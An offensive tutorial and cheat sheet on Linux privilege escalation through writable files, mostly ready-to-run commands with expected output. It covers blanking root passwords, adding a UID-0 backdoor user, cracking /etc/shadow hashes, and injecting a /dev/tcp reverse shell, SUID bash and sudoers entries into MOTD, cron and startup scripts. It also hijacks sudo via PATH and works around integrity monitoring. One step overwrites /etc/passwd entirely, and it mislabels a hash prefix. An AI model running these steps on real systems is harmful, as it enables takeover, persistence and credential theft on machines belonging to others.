# Writable Files and Directories Exploitation

### Overview

**Writable Files and Directories Exploitation** focuses on identifying and exploiting file system objects that have incorrect permissions, allowing unprivileged users to modify critical system files. This is one of the most common privilege escalation vectors on Linux systems, as even a single misconfigured file or directory can provide a direct path to root access.

When files or directories critical to system operation are writable by non-root users, attackers can modify them to execute arbitrary code with elevated privileges. The most impactful targets include `/etc/passwd` (user database), `/etc/shadow` (password hashes), startup scripts, cron jobs, system service files, and MOTD (Message of the Day) scripts that run as root.

**Key Concepts:**

* **File Permissions** - Read (r), Write (w), Execute (x) permissions for Owner, Group, Others
* **World-Writable** - Files/directories with write permission for "others" (everyone)
* **SUID/SGID Context** - Writable files that execute with elevated privileges
* **Startup Scripts** - Files executed during boot or user login with root privileges
* **Configuration Files** - System files that control authentication and authorization

**Why Writable Files Matter:**

* Direct modification of user authentication databases
* Injection of malicious code into root-executed scripts
* Hijacking of system services and cron jobs
* Creation of backdoor user accounts
* Persistence mechanisms through startup scripts

**Common Vulnerable Locations:**

* `/etc/passwd` - User account database
* `/etc/shadow` - Password hash storage
* `/etc/update-motd.d/` - Login message scripts
* `/etc/cron.*` - Scheduled task directories
* Service unit files in `/etc/systemd/system/`
* Startup scripts in `/etc/init.d/`
* User-writable directories owned by root

***

### Exploitation Workflow Summary

1. Discovery Phase ├─ Find world-writable files ├─ Identify writable directories ├─ Check critical file permissions └─ Locate root-owned writable objects
2. Critical File Analysis ├─ Test /etc/passwd writability ├─ Test /etc/shadow readability/writability ├─ Check startup script permissions └─ Examine cron job file permissions
3. Exploitation Selection ├─ Direct modification (passwd/shadow) ├─ Script injection (MOTD, cron) ├─ Service hijacking └─ Backdoor creation
4. Privilege Escalation ├─ Modify authentication files ├─ Inject malicious code ├─ Trigger execution └─ Obtain root shell
5. Persistence ├─ Create backdoor accounts ├─ Plant SSH keys ├─ Modify startup scripts └─ Establish recurring access

***

### Phase 1: Finding Writable Files and Directories

#### Understanding File Permissions

**Linux permission structure:**

```
-rwxrwxrwx
 │││││││││
 │││└┴┴┴┴┴─ Others (everyone else)
 ││└─────── Group
 │└──────── Owner
 └───────── File type (- = file, d = directory, l = link)
```

**Permission values:**

* `r` (4) - Read permission
* `w` (2) - Write permission
* `x` (1) - Execute permission

**Dangerous permission patterns:**

* `777` (rwxrwxrwx) - Everyone can read, write, execute
* `666` (rw-rw-rw-) - Everyone can read and write
* `o+w` - Others have write permission (world-writable)

#### Find All World-Writable Files

**Search for world-writable files:**

```bash
find / -type f -perm -o+w 2>/dev/null
```

**Parameters explained:**

* `/` - Search from root directory
* `-type f` - Only files (not directories)
* `-perm -o+w` - Files where "others" have write permission
* `2>/dev/null` - Suppress permission denied errors

**Expected output:**

```
/tmp/test.txt
/var/tmp/script.sh
/etc/passwd
/home/user/.bashrc
/opt/app/config.conf
```

**Why this matters:** Any file writable by everyone can potentially be exploited. Critical system files should never appear in this list.

**Alternative search with detailed output:**

```bash
find / -type f -perm -o+w -exec ls -la {} \; 2>/dev/null
```

**Expected output:**

```
-rw-rw-rw- 1 root root 1234 Dec 20 10:00 /etc/passwd
-rwxrwxrwx 1 root root  567 Dec 19 15:30 /etc/update-motd.d/00-header
-rw-rw-rw- 1 user user  890 Dec 18 09:00 /tmp/notes.txt
```

**Search for group-writable files:**

```bash
find / -type f -perm -g+w 2>/dev/null | grep -v "^/proc\|^/sys"
```

**Why check group-writable:** If you're a member of a group with write access to sensitive files, you can exploit them.

#### Find World-Writable Directories

**Search for world-writable directories:**

```bash
find / -type d -perm -o+w 2>/dev/null
```

**Expected output:**

```
/tmp
/var/tmp
/dev/shm
/var/crash
/home/backup
```

**Why directories matter:** World-writable directories allow anyone to create, modify, or delete files within them. Dangerous if owned by root or used by system services.

**Find writable directories owned by root:**

```bash
find / -type d -writable -user root 2>/dev/null
```

**Expected output:**

```
/tmp
/var/tmp
/home/shared
/opt/app/data
```

**Why this is critical:** Root-owned writable directories can be exploited for:

* Replacing legitimate files with malicious versions
* Creating files that root processes will execute
* Race condition exploits
* Symlink attacks

**Detailed directory listing:**

```bash
find / -type d -writable -user root -exec ls -ld {} \; 2>/dev/null
```

**Expected output:**

```
drwxrwxrwx 2 root root 4096 Dec 20 10:00 /opt/app/data
drwxr-xrwx 3 root root 4096 Dec 19 15:30 /var/backups
drwxrwxrwx 2 root root 4096 Dec 18 09:00 /home/shared
```

#### Search for Writable Configuration Files

**Find writable files in /etc:**

```bash
find /etc -writable -type f 2>/dev/null
```

**Expected output:**

```
/etc/passwd
/etc/shadow
/etc/sudoers
/etc/crontab
/etc/systemd/system/custom.service
```

**Why /etc is critical:** Configuration files in /etc control system behavior. Writable files mean you can reconfigure the system.

**Check specific critical files:**

```bash
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/crontab 2>/dev/null
```

**Expected output (vulnerable):**

```
-rw-rw-rw- 1 root root 2345 Dec 20 10:00 /etc/passwd
-rw-r----- 1 root shadow 1234 Dec 20 10:00 /etc/shadow
-rw-rw-rw- 1 root root  567 Dec 19 15:30 /etc/crontab
```

**Expected output (secure):**

```
-rw-r--r-- 1 root root 2345 Dec 20 10:00 /etc/passwd
-rw-r----- 1 root shadow 1234 Dec 20 10:00 /etc/shadow
-r--r----- 1 root root  567 Dec 19 15:30 /etc/sudoers
```

***

### Phase 2: /etc/passwd Exploitation

#### Understanding /etc/passwd

**The /etc/passwd file** contains user account information. Each line represents one user account with colon-separated fields:

```
username:password:UID:GID:comment:home_directory:shell
```

**Example entry:**

```
root:x:0:0:root:/root:/bin/bash
```

**Field explanations:**

* `root` - Username
* `x` - Password placeholder (actual hash in /etc/shadow)
* `0` - User ID (UID 0 = root)
* `0` - Group ID (GID 0 = root group)
* `root` - Comment/full name
* `/root` - Home directory
* `/bin/bash` - Login shell

**Critical insight:** The `x` in the password field means the password hash is stored in `/etc/shadow`. If the `x` is removed or replaced with a hash, the system will accept authentication against the hash directly in `/etc/passwd`.

#### Check if /etc/passwd is Readable

**Read /etc/passwd:**

```bash
cat /etc/passwd
```

**Expected output:**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
john:x:1000:1000:John Doe:/home/john:/bin/bash
admin:x:1001:1001:Admin User:/home/admin:/bin/bash
```

**Why this matters:** `/etc/passwd` is world-readable by design (needed for user lookups). The critical question is whether it's writable.

#### Root Account Without Password

**Check if root has no password (rare but possible):**

```bash
head -n 1 /etc/passwd
```

**Vulnerable output:**

```
root::0:0:root:/root:/bin/bash
```

**Notice:** No `x` in the password field—this means no password required!

**Exploit immediately:**

```bash
su
```

**Expected result:**

```
# whoami
root
```

**Why this works:** Empty password field means the system allows authentication without a password.

#### /etc/passwd is Writable - Method 1: Remove Password

**Check if /etc/passwd is writable:**

```bash
ls -la /etc/passwd
```

**Vulnerable output:**

```
-rw-rw-rw- 1 root root 2345 Dec 20 10:00 /etc/passwd
```

**Current root entry:**

```
root:x:0:0:root:/root:/bin/bash
```

**Remove the 'x' to disable password requirement:**

```bash
# Method 1: Using sed
sed -i 's/root:x:/root::/' /etc/passwd

# Method 2: Using vim/nano
vim /etc/passwd
# Change: root:x:0:0:root:/root:/bin/bash
# To:     root::0:0:root:/root:/bin/bash
```

**After modification:**

```
root::0:0:root:/root:/bin/bash
```

**Switch to root (no password required):**

```bash
su
```

**Expected result:**

```
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

**Why this works:** The system checks /etc/passwd first. An empty password field means no authentication required.

#### /etc/passwd is Writable - Method 2: Create New Root User

**Step 1: Generate password hash**

```bash
openssl passwd -1 -salt new 123
```

**Parameters explained:**

* `passwd` - Generate password hash
* `-1` - Use MD5 algorithm
* `-salt new` - Use "new" as salt
* `123` - The actual password

**Expected output:**

```
$1$new$p7ptkEKU1HnaHpRtzNizS1
```

**Alternative hash generation methods:**

```bash
# Using mkpasswd (if available)
mkpasswd -m sha-512 mypassword

# Using Python
python3 -c 'import crypt; print(crypt.crypt("mypassword", crypt.mksalt(crypt.METHOD_SHA512)))'

# Using Perl
perl -e 'print crypt("mypassword", "\$6\$saltsalt\$") . "\n"'
```

**Step 2: Add new root user entry to /etc/passwd**

```bash
echo 'hacker:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
```

**Entry breakdown:**

* `hacker` - New username
* `$1$new$p7ptkEKU1HnaHpRtzNizS1` - Password hash for "123"
* `0` - UID 0 (root)
* `0` - GID 0 (root group)
* `root` - Comment
* `/root` - Home directory
* `/bin/bash` - Shell

**Why UID 0 matters:** ANY account with UID 0 has root privileges, regardless of username.

**Step 3: Switch to new user**

```bash
su hacker
```

**Enter password when prompted:**

```
Password: 123
```

**Verify root access:**

```bash
whoami
```

**Expected output:**

```
hacker
```

```bash
id
```

**Expected output:**

```
uid=0(hacker) gid=0(root) groups=0(root)
```

**Why username shows "hacker" but you're root:** The username is just a label. UID 0 is what grants root privileges.

**Alternative: Direct modification of root entry**

```bash
# Replace root's password hash with your own
sed -i 's/root:x:/root:$1$new$p7ptkEKU1HnaHpRtzNizS1:/' /etc/passwd
```

**Now login as root:**

```bash
su root
Password: 123
```

***

### Phase 3: /etc/shadow Exploitation

#### Understanding /etc/shadow

**The /etc/shadow file** stores actual password hashes and password aging information. Format:

```
username:hash:lastchange:min:max:warn:inactive:expire:reserved
```

**Example entry:**

```
root:$6$xyz$abcdef123456...:18900:0:99999:7:::
```

**Field explanations:**

* `root` - Username
* `$6$xyz$abcdef...` - Password hash (SHA-512)
* `18900` - Days since 1970-01-01 when password was last changed
* `0` - Minimum days before password can be changed
* `99999` - Maximum days password is valid
* `7` - Days before expiry to warn user
* Empty fields for inactive days, expiration date, and reserved

**Hash format explained:**

```
$algorithm$salt$hash
```

* `$1$` - MD5
* `$5$` - SHA-256
* `$6$` - SHA-512
* `$y$` or `$2b$` - Bcrypt

#### /etc/shadow is Readable

**Check if you can read /etc/shadow:**

```bash
ls -la /etc/shadow
```

**Secure output:**

```
-rw-r----- 1 root shadow 1234 Dec 20 10:00 /etc/shadow
```

**Vulnerable output:**

```
-rw-r--r-- 1 root root 1234 Dec 20 10:00 /etc/shadow
```

**Read the shadow file:**

```bash
cat /etc/shadow
```

**Expected output:**

```
root:$6$xyz$abcdef123456789...:18900:0:99999:7:::
john:$6$abc$fedcba987654321...:18895:0:99999:7:::
admin:$6$def$123456789abcdef...:18890:0:99999:7:::
mysql:!:18858:0:99999:7:::
www-data:*:18858:0:99999:7:::
```

**Hash indicators:**

* Full hash (`$6$...`) - Account has password
* `!` - Account locked/disabled
* `*` - Password authentication disabled
* Empty field - No password required (dangerous!)

**Extract only accounts with valid hashes:**

```bash
cat /etc/shadow | grep -v '!\|*' | grep '\$'
```

**Expected output:**

```
root:$6$xyz$abcdef123456789...:18900:0:99999:7:::
john:$6$abc$fedcba987654321...:18895:0:99999:7:::
admin:$6$def$123456789abcdef...:18890:0:99999:7:::
```

**Find users with no password:**

```bash
awk -F: '($2=="") {print $1}' /etc/shadow
```

**Expected output:**

```
backup
guest
```

**Why this is dangerous:** These accounts can be accessed with no password.

**Test empty password accounts:**

```bash
su backup
# Press Enter without typing password
```

#### Cracking Shadow File Hashes

**Copy hashes to attacker machine for cracking:**

```bash
cat /etc/shadow > shadow.txt
```

**Transfer to attacker machine, then crack:**

```bash
# Using John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt

# Using Hashcat
hashcat -m 1800 -a 0 shadow.txt /usr/share/wordlists/rockyou.txt

# Using Hashcat with SHA-512
hashcat -m 1800 shadow.txt rockyou.txt --force
```

**Expected output (John):**

```
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (john)
admin2023        (admin)
MyPass!2023      (root)
3g 0:00:02:45 DONE (2025-12-20 10:00) 0.01819g/s 2847p/s 8541c/s 8541C/s
```

**Use cracked passwords:**

```bash
su john
Password: password123

su root
Password: MyPass!2023
```

#### /etc/shadow is Writable

**Check writability:**

```bash
ls -la /etc/shadow
```

**Vulnerable output:**

```
-rw-rw-rw- 1 root root 1234 Dec 20 10:00 /etc/shadow
```

**Step 1: Generate new password hash**

```bash
mkpasswd -m sha-512 newrootpass
```

**Expected output:**

```
$6$randomsalt$longhashabcdef123456789...
```

**Alternative generation:**

```bash
python3 -c 'import crypt; print(crypt.crypt("newrootpass", crypt.mksalt(crypt.METHOD_SHA512)))'
```

**Step 2: Replace root's password hash**

```bash
# Backup original (optional)
cp /etc/shadow /tmp/shadow.bak

# Method 1: Using sed
sed -i 's|^root:[^:]*|root:$6$randomsalt$longhashabcdef123456789...|' /etc/shadow

# Method 2: Using vim
vim /etc/shadow
# Find root line, replace hash with your generated hash
```

**Before:**

```
root:$6$old$oldhashabcdef...:18900:0:99999:7:::
```

**After:**

```
root:$6$randomsalt$longhashabcdef123456789...:18900:0:99999:7:::
```

**Step 3: Switch to root with new password**

```bash
su root
Password: newrootpass
```

**Expected result:**

```
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

**Alternative: Remove root password entirely**

```bash
# Replace root's hash with empty field
sed -i 's/^root:[^:]*/root:/' /etc/shadow
```

**After this modification:**

```
root::18900:0:99999:7:::
```

**Switch to root (no password):**

```bash
su root
# Press Enter, no password required
```

***

### Phase 4: Startup Script Exploitation

#### Understanding MOTD Scripts

**MOTD (Message of the Day)** scripts in `/etc/update-motd.d/` execute as root when users log in via SSH. If these scripts are writable, you can inject commands that will execute with root privileges.

**How MOTD works:**

1. User connects via SSH
2. System runs all scripts in `/etc/update-motd.d/` as root
3. Output is displayed as login banner
4. Your injected command executes with root privileges

#### Identifying Writable MOTD Scripts

**Monitor for MOTD execution (using pspy):**

```bash
./pspy64
```

**Expected output showing MOTD execution:**

```
2025/12/20 09:27:45 CMD: UID=0    PID=10959  | run-parts --lsbsysinit /etc/update-motd.d
```

**Why this matters:** `UID=0` means the command runs as root. If MOTD scripts are writable, we can inject code.

**Check MOTD directory permissions:**

```bash
ls -la /etc/update-motd.d/
```

**Vulnerable output:**

```
total 32
drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 .
drwxr-xr-x 80 root root     4096 Dec 20 03:55 ..
-rwxrwxr-x  1 root sysadmin  981 Jul 29 00:30 00-header
-rwxrwxr-x  1 root sysadmin  982 Jul 29 00:30 10-help-text
-rwxrwxr-x  1 root sysadmin 4264 Jul 29 00:30 50-motd-news
-rwxrwxr-x  1 root sysadmin  604 Jul 29 00:30 80-esm
-rwxrwxr-x  1 root sysadmin  299 Jul 29 00:30 91-release-upgrade
```

**Key observation:** Files are owned by root but group `sysadmin` has write permission (`rwx**rwx**r-x`).

**Check if you're in sysadmin group:**

```bash
id
```

**Expected output:**

```
uid=1000(user) gid=1000(user) groups=1000(user),1001(sysadmin)
```

**You're in the sysadmin group - you can write to these files!**

#### Exploiting MOTD Scripts

**Method 1: Read sensitive files**

```bash
echo "cat /root/root.txt" >> /etc/update-motd.d/00-header
```

**Why this works:** When anyone (including root) logs in via SSH, this command executes as root, displaying the root flag.

**Trigger execution by SSH login:**

```bash
# From another terminal or SSH session
ssh user@localhost
```

**Expected output during login:**

```
Welcome to Ubuntu 20.04 LTS
[root flag content displays here]
```

**Method 2: Create SUID bash**

```bash
echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> /etc/update-motd.d/00-header
```

**Trigger by SSH login, then:**

```bash
/tmp/rootbash -p
```

**Expected result:**

```
rootbash-5.0# whoami
root
```

**Method 3: Reverse shell**

```bash
echo "bash -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'" >> /etc/update-motd.d/00-header
```

**On attacker machine:**

```bash
nc -lvnp 4444
```

**When someone logs in via SSH:**

```
Listening on 0.0.0.0 4444
Connection received on 10.10.10.10 49832
bash: no job control in this shell
root@target:~# whoami
root
```

**Method 4: Add to sudoers**

```bash
echo "echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers" >> /etc/update-motd.d/00-header
```

**After SSH login:**

```bash
sudo -l
```

**Expected output:**

```
User user may run the following commands on target:
    (ALL) NOPASSWD: ALL
```

```bash
sudo su
```

**Expected result:**

```
root@target:~#
```

#### Other Writable Startup Scripts

**Check rc.local (legacy startup):**

```bash
ls -la /etc/rc.local
```

**If writable, add reverse shell:**

```bash
echo "bash -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'" >> /etc/rc.local
```

**Check init.d scripts:**

```bash
find /etc/init.d -writable 2>/dev/null
```

**Check systemd service files:**

```bash
find /etc/systemd/system -writable -type f 2>/dev/null
```

***

### Phase 5: Additional Exploitation Vectors

#### Writable Cron Job Scripts

**If cron scripts are writable:**

```bash
ls -la /etc/cron.daily/
```

**Vulnerable output:**

```
-rwxrwxrwx 1 root root 123 Dec 20 10:00 backup.sh
```

**Inject malicious code:**

```bash
echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> /etc/cron.daily/backup.sh
```

**Wait for cron to execute (daily scripts run at \~6:25 AM), then:**

```bash
/tmp/rootbash -p
```

#### Writable Service Files

**If systemd service file is writable:**

```bash
find /etc/systemd/system -writable 2>/dev/null
```

**Modify service to execute your code:**

```bash
cat << EOF > /etc/systemd/system/vulnerable.service
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'

[Install]
WantedBy=multi-user.target
EOF
```

**Reload and start:**

```bash
systemctl daemon-reload
systemctl start vulnerable.service
/tmp/rootbash -p
```

#### Writable Script in PATH

**Check PATH directories for writable scripts:**

```bash
echo $PATH
```

**Expected output:**

```
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**Check if any PATH directories are writable:**

```bash
find /usr/local/bin -writable 2>/dev/null
```

**If writable, create malicious script:**

```bash
cat << EOF > /usr/local/bin/sudo
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
/usr/bin/sudo "\$@"
EOF
chmod +x /usr/local/bin/sudo
```

**When admin runs 'sudo' (which finds your script first):**

```bash
/tmp/rootbash -p
```

***

### Troubleshooting

#### Cannot Modify /etc/passwd Despite Write Permissions

**Problem:** File shows writable but modifications fail

**Solution:**

```bash
# Check for immutable attribute
lsattr /etc/passwd

# Expected output if immutable:
----i---------e---- /etc/passwd

# Remove immutable flag (requires root)
sudo chattr -i /etc/passwd

# Now modify
echo 'hacker:...:0:0:...' >> /etc/passwd
```

**Why it works:** Immutable attribute prevents modifications even with write permissions. Removing it allows changes.

#### Modified /etc/passwd but Cannot Login

**Problem:** Added new user to /etc/passwd but authentication fails

**Solution:**

```bash
# Check if /etc/shadow requires entry too
grep hacker /etc/shadow

# If not present, add matching entry
echo 'hacker:$1$new$p7ptkEKU1HnaHpRtzNizS1:18900:0:99999:7:::' >> /etc/shadow

# Or remove password requirement entirely
sed -i 's/hacker:x:/hacker::/' /etc/passwd
```

**Why it works:** Some systems require matching entries in both files for authentication to work.

#### MOTD Script Injected but Not Executing

**Problem:** Modified MOTD script but commands don't execute on login

**Solution:**

```bash
# Verify script is executable
ls -la /etc/update-motd.d/00-header
chmod +x /etc/update-motd.d/00-header

# Check if MOTD is enabled
cat /etc/ssh/sshd_config | grep PrintMotd

# Should show:
PrintMotd yes

# Test script manually
sudo run-parts /etc/update-motd.d/

# Check for syntax errors
bash -n /etc/update-motd.d/00-header
```

**Why it works:** Scripts must be executable and MOTD must be enabled in SSH configuration.

#### Password Hash Generated but Not Working

**Problem:** Generated hash but cannot authenticate with it

**Solution:**

```bash
# Verify hash format matches system
grep '^root:' /etc/shadow

# If system uses SHA-512 ($6$), generate matching hash
mkpasswd -m sha-512 mypassword

# If mkpasswd unavailable, use Python
python3 -c 'import crypt; print(crypt.crypt("mypassword", crypt.mksalt(crypt.METHOD_SHA512)))'

# Ensure no trailing spaces or newlines
echo 'root:HASH:18900:0:99999:7:::' | tr -d ' \n' >> /etc/shadow
```

**Why it works:** Hash algorithm must match system configuration. Extra whitespace breaks parsing.

#### Script Injection Not Persisting

**Problem:** Modifications to scripts disappear after some time

**Solution:**

```bash
# Check if file is on read-only filesystem
mount | grep '/etc'

# Check for file monitoring/restoration
ps aux | grep -i 'tripwire\|aide\|ossec'

# Check for scheduled restoration
cat /etc/crontab | grep -i 'restore\|backup\|copy'

# Make modifications immediately before triggering
echo "PAYLOAD" >> /etc/update-motd.d/00-header && ssh user@localhost
```

**Why it works:** Security tools or backup systems may restore modified files. Immediate exploitation prevents restoration.

***

### Quick Reference

#### Find Writable Files

```bash
# World-writable files
find / -type f -perm -o+w 2>/dev/null

# World-writable directories
find / -type d -perm -o+w 2>/dev/null

# Writable /etc files
find /etc -writable -type f 2>/dev/null

# Root-owned writable directories
find / -type d -writable -user root 2>/dev/null
```

#### /etc/passwd Exploitation

```bash
# Check if writable
ls -la /etc/passwd

# Remove root password
sed -i 's/root:x:/root::/' /etc/passwd

# Add new root user
openssl passwd -1 -salt new 123
echo 'hacker:$1$new$HASH:0:0::/root:/bin/bash' >> /etc/passwd
su hacker
```

#### /etc/shadow Exploitation

```bash
# Check if readable/writable
ls -la /etc/shadow

# Find users with no password
awk -F: '($2=="") {print $1}' /etc/shadow

# Generate new hash
mkpasswd -m sha-512 newpass

# Replace root hash
sed -i 's|^root:[^:]*|root:$6$NEWHASH|' /etc/shadow
su root
```

#### MOTD Exploitation

```bash
# Check MOTD permissions
ls -la /etc/update-motd.d/

# Inject command to read root file
echo "cat /root/root.txt" >> /etc/update-motd.d/00-header

# Inject SUID bash creation
echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> /etc/update-motd.d/00-header

# Trigger via SSH login
ssh user@localhost
```

#### Quick Root Shell

```bash
# Via /etc/passwd
echo 'root::0:0::/root:/bin/bash' > /etc/passwd
su

# Via SUID bash
echo "cp /bin/bash /tmp/rb; chmod +s /tmp/rb" >> WRITABLE_SCRIPT
/tmp/rb -p

# Via sudoers addition
echo "echo 'user ALL=(ALL) NOPASSWD:ALL'>>/etc/sudoers" >> WRITABLE_SCRIPT
sudo su
```
